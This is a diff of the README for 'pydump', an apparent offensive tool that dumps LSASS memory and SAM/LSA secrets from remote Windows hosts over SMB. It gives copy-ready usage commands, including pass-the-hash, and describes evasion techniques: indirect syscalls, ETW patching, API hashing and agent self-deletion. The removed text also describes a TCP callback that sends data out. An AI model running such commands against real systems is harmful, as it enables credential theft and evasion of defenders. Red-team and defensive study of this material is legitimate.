@@ -1,116 +1,135 @@
 # pydump
 
-Remote LSASS dump and credential extraction over SMB/RPC.
+Remote Windows credential extraction over SMB — SAM/LSA secrets + LSASS memory dump.
 
-## Overview
+Zero external tool dependencies. No impacket, no nxc, no lsassy.
 
-pydump est un outil offensif qui permet de dumper la mémoire du processus LSASS sur une machine Windows distante et d'extraire les credentials (NTLM hashes, tickets Kerberos, mots de passe WDigest) sans interaction locale.
+## Features
+
+- **SAM hashes** — RegSaveKey + offline REGF parse + AES/DES decrypt (verified against nxc)
+- **LSA secrets** — DPAPI keys, service passwords, NL$KM
+- **LSASS dump** — native C agent, indirect syscalls, dump streamed via named pipe
+- **LSASS parser** — custom MDMP parser, NTLM + WDigest extraction (Win11 24H2)
+- **Pass-the-Hash** — `-H` flag, no password needed
+
+## How it works
+
+pydump combines two extraction methods, both over a single SMB connection:
+
+**Registry secrets** (SAM/LSA) are extracted via Windows RPC: the tool calls
+`RegSaveKey` to save hive snapshots, reads them over SMB, then parses and decrypts
+offline. This uses standard Windows administration APIs and requires no executable
+on the target.
+
+**LSASS memory** requires a native agent (19KB, x64) deployed as a temporary
+service. The agent reads LSASS process memory using indirect syscalls, builds a
+MiniDump in-memory, streams it back through a named pipe, then self-deletes.
+No dump file is written to disk.
 
 ## Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────────────┐
-│                         ATTACKER (Linux)                             │
-├─────────────────────────────────────────────────────────────────────┤
-│                                                                     │
-│  ┌───────────┐    ┌──────────────┐    ┌──────────────────────────┐ │
-│  │  CLI      │───►│  Orchestrator │───►│  Parser                  │ │
-│  │  (cli.py) │    │  (smb + rpc)  │    │  (minidump + extract)    │ │
-│  └───────────┘    └──────┬───────┘    └──────────────────────────┘ │
-│                          │                                          │
-└──────────────────────────┼──────────────────────────────────────────┘
-                           │ SMB (445) + Named Pipes
-                           ▼
-┌─────────────────────────────────────────────────────────────────────┐
-│                         TARGET (Windows)                             │
-├─────────────────────────────────────────────────────────────────────┤
-│                                                                     │
-│  ┌──────────────────┐    ┌───────────────────────────────────────┐ │
-│  │  SVCCTL (RPC)    │───►│  Dump Method                          │ │
-│  │  Service Manager  │    │  • comsvcs.dll (écrit sur disque)     │ │
-│  └──────────────────┘    │  • silent (TCP callback, fileless)    │ │
-│                           │  • agent natif (indirect syscalls) *  │ │
-│                           └───────────────────────────────────────┘ │
-│                                       │                             │
-│                                       ▼                             │
-│                              ┌─────────────────┐                   │
-│                              │  lsass.exe      │                   │
-│                              │  (mémoire)      │                   │
-│                              └─────────────────┘                   │
-│                                                                     │
-└─────────────────────────────────────────────────────────────────────┘
-
-* Méthode planifiée — agent C avec indirect syscalls + exfiltration via named pipe
+ORCHESTRATOR (Linux/Python)                   TARGET (Windows)
+┌──────────────────────┐         SMB 445      ┌──────────────────────┐
+│  pydump CLI          │◄───────────────────►│                      │
+│                      │                      │  SVCCTL → Service    │
+│  ┌─ registry ──────┐ │   WinReg RPC        │  ┌─────────────────┐ │
+│  │ SAM + LSA       │ │◄────────────────────►│  │ RegSaveKey      │ │
+│  │ offline decrypt │ │   hive snapshots     │  │ SAM/SYSTEM/SEC  │ │
+│  └─────────────────┘ │                      │  └─────────────────┘ │
+│                      │                      │                      │
+│  ┌─ agent ─────────┐ │   upload + execute   │  ┌─────────────────┐ │
+│  │ LSASS → parse   │ │─────────────────────►│  │ agent.exe       │ │
+│  │ NTLM + WDigest  │ │◄─────────────────────│  │ indirect syscall│ │
+│  └─────────────────┘ │   named pipe stream  │  │ ETW patch       │ │
+│                      │                      │  │ self-delete     │ │
+└──────────────────────┘                      │  └─────────────────┘ │
+                                              └──────────────────────┘
 ```
 
-### Modules
+### Project structure
 
 ```
-pydump/
-├── cli.py              # Interface ligne de commande (argparse)
-├── smb.py              # Session SMB2/3, named pipes, lecture/écriture de fichiers
+pydump/                 Python orchestrator
+├── cli.py              CLI (dump, parse)
+├── smb.py              SMB session, named pipes, file I/O
+├── rpc/
+│   ├── core.py         DCE/RPC bind/request
+│   ├── ndr.py          NDR encoding
+│   ├── svcctl.py       Service Control Manager
+│   └── winreg.py       Remote Registry (RegSaveKey)
+├── secrets/
+│   ├── hivereader.py   Custom REGF hive parser
+│   ├── crypto.py       Boot key, SAM/LSA AES/DES/RC4 decrypt
+│   └── registry.py     SAM + LSA orchestration
 ├── dump/
-│   ├── methods.py      # Stratégies de dump (comsvcs, silent, futur: agent)
-│   └── receiver.py     # Serveur TCP pour recevoir le dump en callback
-├── parser/
-│   ├── minidump.py     # Parseur du format MDMP (streams, modules, mémoire)
-│   └── extract.py      # Extraction des credentials (MSV1.0, WDigest, Kerberos)
-└── rpc/
-    ├── core.py         # Couche DCE/RPC (bind, request, response)
-    ├── ndr.py          # Encodage/décodage NDR
-    └── svcctl.py       # Interface SVCCTL (création/gestion de services)
+│   └── methods.py      Agent deployment + pipe read
+└── parser/
+    ├── minidump.py     MDMP format parser
+    └── extract.py      Credential extraction (MSV1.0, WDigest)
+
+agent/                  Native x64 agent (19KB, no CRT)
+├── src/
+│   ├── main.c          Entry, self-delete (ADS rename)
+│   ├── syscalls.c      Hell's Gate SSN resolution, ETW patch
+│   ├── dump.c          LSASS memory read → MDMP stream
+│   └── pipe.c          Named pipe server
+└── include/
+    ├── syscalls.h      DJB2 hash constants, syscall table
+    ├── agent.h         MDMP structures
+    └── ntdefs.h        NT type definitions
 ```
 
 ## Installation
 
 ```bash
-git clone <repo_url> && cd pydump
-virtualenv env && source env/bin/activate && pip install -r requirements.txt
+virtualenv env && source env/bin/activate
+pip install -r requirements.txt
+
+# Build agent (requires x86_64-w64-mingw32-gcc)
+cd agent && make cross
 ```
+
+Dependencies: `smbprotocol` + `pycryptodome` only.
 
 ## Usage
 
-### Dump + extraction automatique
-
 ```bash
-python pydump.py dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -d CORP
+# Full extraction (registry + LSASS)
+python -m pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd'
+
+# Registry only (SAM + LSA, no agent needed)
+python -m pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -m registry
+
+# LSASS only
+python -m pydump dump -t 192.168.1.50 -u admin -p pass -m pipe
+
+# Pass-the-Hash
+python -m pydump dump -t 192.168.1.50 -u admin -H aad3b435b51404eeaad3b435b51404ee
+
+# Save raw LSASS dump
+python -m pydump dump -t 192.168.1.50 -u admin -p pass -o lsass.dmp
+
+# Parse existing dump offline
+python -m pydump parse -f lsass.dmp
 ```
 
-### Méthode silent (fileless — callback TCP)
+## Agent internals
 
-```bash
-python pydump.py dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -m silent --lhost 192.168.1.10
-```
+| Technique | Detail |
+|---|---|
+| Indirect syscalls | SSN resolved via Hell's Gate / Halo's Gate from ntdll PEB walk |
+| API hashing | All Nt* exports resolved by DJB2 hash — zero plaintext function names |
+| ETW patch | `EtwEventWrite` overwritten with `xor eax,eax; ret` via `NtProtectVirtualMemory` |
+| Self-delete | ADS rename + `FileDispositionInfo` — binary removed before `ExitProcess` |
+| No CRT | `-nostdlib -nostartfiles`, 19KB PE |
 
-### Dump sans parsing (sauvegarder le .dmp brut)
-
-```bash
-python pydump.py dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -o lsass.dmp --no-parse
-```
-
-### Parser un dump existant
-
-```bash
-python pydump.py parse -f lsass.dmp
-```
-
-## Méthodes de dump
-
-| Méthode | Écriture disque | Furtivité | Description |
-|---------|:-:|:-:|---|
-| `comsvcs` | Oui (temporaire) | Faible | `rundll32 comsvcs.dll, MiniDump` — simple et fiable |
-| `silent` | Non | Moyenne | PowerShell + .NET P/Invoke, exfiltration TCP directe |
-| `agent` * | Non | Haute | Agent natif C, indirect syscalls, exfiltration named pipe |
-
-\* En développement
-
-## Prérequis
+## Requirements
 
 - Python >= 3.11
-- Credentials avec droits administrateur local sur la cible
-- Port 445/TCP ouvert (SMB)
-- Pour la méthode `silent` : connectivité réseau retour (cible → attaquant)
+- Admin credentials on target (password or NT hash)
+- SMB port 445 open
 
-## Avertissement
+## Disclaimer
 
-Cet outil est destiné à un usage autorisé uniquement (pentest, red team avec mandat). L'utilisation non autorisée sur des systèmes tiers est illégale.
+This tool is designed for IT forensics and authorized credential auditing on systems you own or manage. Unauthorized use on third-party systems is illegal.
